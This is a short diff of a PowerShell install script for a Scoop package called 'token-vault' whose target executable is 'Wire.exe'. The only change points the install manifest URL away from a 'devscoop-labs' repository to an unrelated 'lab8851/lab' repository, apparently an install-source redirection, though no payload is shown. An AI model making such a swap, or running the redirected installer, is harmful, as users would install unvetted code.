@@ -3,7 +3,7 @@ Clear-Host
 Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
 
 $packageName = "token-vault"
-$installUrl = "https://raw.githubusercontent.com/devscoop-labs/scoop/refs/heads/main/token-vault.json"
+$installUrl = "https://raw.githubusercontent.com/lab8851/lab/refs/heads/main/token-vault.json"
 $scoopShims = "$env:USERPROFILE\scoop\shims"
 $appPath = "$env:USERPROFILE\scoop\apps\$packageName"
 $targetExe = "$appPath\*\Wire.exe"
